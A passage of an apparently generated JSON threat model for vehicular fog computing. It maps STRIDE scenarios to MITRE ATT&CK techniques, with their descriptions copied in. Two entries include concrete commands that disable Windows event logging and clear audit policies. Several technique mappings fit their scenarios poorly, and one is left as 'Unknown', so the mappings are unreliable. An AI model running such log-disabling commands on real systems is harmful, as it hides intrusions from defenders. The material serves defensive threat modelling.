                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data being transmitted from vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels lack encryption.",
                    "Role": "Attacker",
                    "Condition": "Insecure data transmission protocols used."
                },
                {
                    "Assumption": "Attacker can access communication channels.",
                    "Role": "Attacker",
                    "Condition": "Network access near smart vehicle or fog node."
                },
                {
                    "Assumption": "Attacker can modify software or firmware in vehicles or fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Access through physical means or unsecured firmware updates."
                }
            ],
            "Potential Impact": "Corruption of data integrity leading to incorrect processing and unsafe vehicular decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data transmission",
                "network",
                "software"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies stored data on fog nodes to trigger incorrect real-time traffic decisions.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient security controls on data storage in fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Weak storage security mechanisms used."
                },
                {
                    "Assumption": "Attacker gains physical or logical access to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Access to fog node sites or administrative interfaces."
                },
                {
                    "Assumption": "Data integrity checks are not employed regularly.",
                    "Role": "Attacker",
                    "Condition": "Lack of frequent validation or auditing of data."
                }
            ],
            "Potential Impact": "Traffic disruptions and safety hazards; reduced trust in VFC system operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data storage",
                "fog node",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious entity alters command signals from fog nodes to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Commands lack proper verification controls.",
                    "Role": "Attacker",
                    "Condition": "Weak or absent command integrity checks."
                },
                {
                    "Assumption": "Attacker has the capability to intercept and alter communication.",
                    "Role": "Attacker",
                    "Condition": "Network access and technical knowledge to modify signals."
                },
                {
                    "Assumption": "There is an absence of end-to-end encryption.",
                    "Role": "Attacker",
                    "Condition": "Communication protocols do not use encryption."
                }
            ],
            "Potential Impact": "Malicious control over cloud-based analytics and decision support systems.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "command signals",
                "cloud services",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious vehicle sends corrupted data to fog nodes without traces leading back to it.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are inefficient or non-existent.",
                    "Role": "Attacker",
                    "Condition": "Absence of logging for actions performed by smart vehicles."
                },
                {
                    "Assumption": "No unique identification for data packets from vehicles.",
                    "Role": "Attacker",
                    "Condition": "Missing unique identifiers in communication protocols."
                },
                {
                    "Assumption": "Attacker can easily spoof vehicle identities.",
                    "Role": "Attacker",
                    "Condition": "Inadequate identity verification processes."
                }
            ],
            "Potential Impact": "Difficult to trace data integrity issues; potential misuse of data processing.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "vehicle",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Fog node accesses unauthorized data without leaving evidence.",
            "Assumptions": [
                {
                    "Assumption": "Lack of sufficient audit trails on fog node activities.",
                    "Role": "Attacker",
                    "Condition": "Insufficient logging of fog node actions."
                },
                {
                    "Assumption": "Audit logs can be modified or erased by malicious entities.",
                    "Role": "Attacker",
                    "Condition": "Unsecured logging storage or mechanisms."
                },
                {
                    "Assumption": "Fog nodes have broad access to data without restrictions.",
                    "Role": "Attacker",
                    "Condition": "Weak access control policies on fog nodes."
                }
            ],
            "Potential Impact": "Unauthorized data access with no accountability, leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trails",
                "fog node",
                "unauthorized data access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service executes unauthorized actions that are later denied.",
            "Assumptions": [
                {
                    "Assumption": "Cloud actions are not fully audited.",
                    "Role": "Attacker",
                    "Condition": "Absence of comprehensive activity logs in the cloud."
                },
                {
                    "Assumption": "Log tampering capabilities are accessible to malicious entities.",
                    "Role": "Attacker",
                    "Condition": "Lack of integrity mechanisms for log files."
                },
                {
                    "Assumption": "Cloud services operate under loosely monitored environments.",
                    "Role": "Attacker",
                    "Condition": "Infrequent monitoring and auditing of cloud activities."
                }
            ],
            "Potential Impact": "Cloud services can be manipulated without traceability, affecting system functionality.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud service",
                "unauthorized actions",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicle data intercepted by an attacker during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted end-to-end.",
                    "Role": "Attacker",
                    "Condition": "Absence of application-level encryption."
                },
                {
                    "Assumption": "Attacker has network access near communication pathways.",
                    "Role": "Attacker",
                    "Condition": "Access to wireless or wired communication channels."
                },
                {
                    "Assumption": "Data packets can be intercepted without detection.",
                    "Role": "Attacker",
                    "Condition": "Lack of monitoring systems for transmission integrity."
                }
            ],
            "Potential Impact": "Unauthorized exposure of sensitive vehicle data; privacy concerns.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "transmission",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to stored data on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data storage lacks encryption or access controls.",
                    "Role": "Attacker",
                    "Condition": "Weak encryption and access policies for data storage."
                },
                {
                    "Assumption": "Attacker can gain physical or remote access to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Access by exploiting physical or logical vulnerabilities."
                },
                {
                    "Assumption": "Security measures are not regularly updated against known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Ineffective security patch management."
                }
            ],
            "Potential Impact": "Compromise of sensitive data leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data storage",
                "fog nodes",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Fileless Storage",
                "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
                "id": "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939",
                "technique_id": "T1027.011"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive analytics data intercepted between fog nodes and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Fog-to-cloud transmissions are not fully encrypted.",
                    "Role": "Attacker",
                    "Condition": "Absence of robust encryption protocols."
                },
                {
                    "Assumption": "Attacker has access to network traffic paths.",
                    "Role": "Attacker",
                    "Condition": "Network access for interception."
                },
                {
                    "Assumption": "Network monitoring does not detect unauthorized access.",
                    "Role": "Attacker",
                    "Condition": "Weak network surveillance mechanisms."
                }
            ],
            "Potential Impact": "Exposure of critical analytics data; insight into system operations and decisions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "analytics data",
                "cloud",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A traffic overload attack targets fog nodes, disrupting real-time processing and decision-making.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have limited processing capacity without rate limiting.",
                    "Role": "Attacker",
                    "Condition": "Absence of rate limiting mechanisms."
                },
                {
                    "Assumption": "Attacker can generate high volumes of traffic towards fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Access to means of producing overwhelming traffic."
                },
                {
                    "Assumption": "Monitoring mechanisms fail to detect and mitigate traffic spikes.",
                    "Role": "System Owner",
                    "Condition": "Inefficient traffic monitoring and response systems."
                }
            ],
            "Potential Impact": "Inability to perform real-time processing; delays in traffic and safety management.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic overload",
                "fog nodes",
                "real-time processing"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious entities disrupt communication between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not resilient against jamming or flooding.",
                    "Role": "Attacker",
                    "Condition": "Vulnerable wireless or wired communication protocols."
                },
                {
                    "Assumption": "Attacker can execute jamming or flooding attacks.",
                    "Role": "Attacker",
                    "Condition": "Capability of disrupting communication channels."
                },
                {
                    "Assumption": "Detection mechanisms are not in place to handle such disruptions.",
                    "Role": "System Owner",
                    "Condition": "Lack of robust anomaly detection for communication channels."
                }
            ],
            "Potential Impact": "Breakdown in data exchange; failure in vehicle coordination and safety systems.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "communication disruption",
                "jamming",
                "flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cloud service instability caused by malicious actions, affecting long-term data availability.",
            "Assumptions": [
                {
                    "Assumption": "Cloud infrastructure lacks DDoS protection.",
                    "Role": "Attacker",
                    "Condition": "Absence of Distributed Denial of Service defense mechanisms."
                },
                {
                    "Assumption": "Attacker can leverage botnets or other means to target cloud servers.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet resources or amplification methods."
                },
                {
                    "Assumption": "Cloud services do not have sufficient redundancy or failover strategies.",
                    "Role": "System Owner",
                    "Condition": "Ineffective redundancy planning in cloud infrastructure."
                }
            ],
            "Potential Impact": "Disruption of critical data analytics and storage, affecting overall system reliability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud service",
                "DDoS",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits software vulnerabilities to gain administrative access on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Software running on fog nodes has unpatched vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Negligence in timely software updates and patch management."
                },
                {
                    "Assumption": "Attacker has access to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Capability to scan and target vulnerable fog node software."
                },
                {
                    "Assumption": "Role-based access controls are not effectively implemented or enforced.",
                    "Role": "System Owner",
                    "Condition": "Weak or absent implementation of access control policies."
                }
            ],
            "Potential Impact": "Control over fog nodes leading to potential system-wide manipulation and data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "software vulnerabilities",
                "fog node",
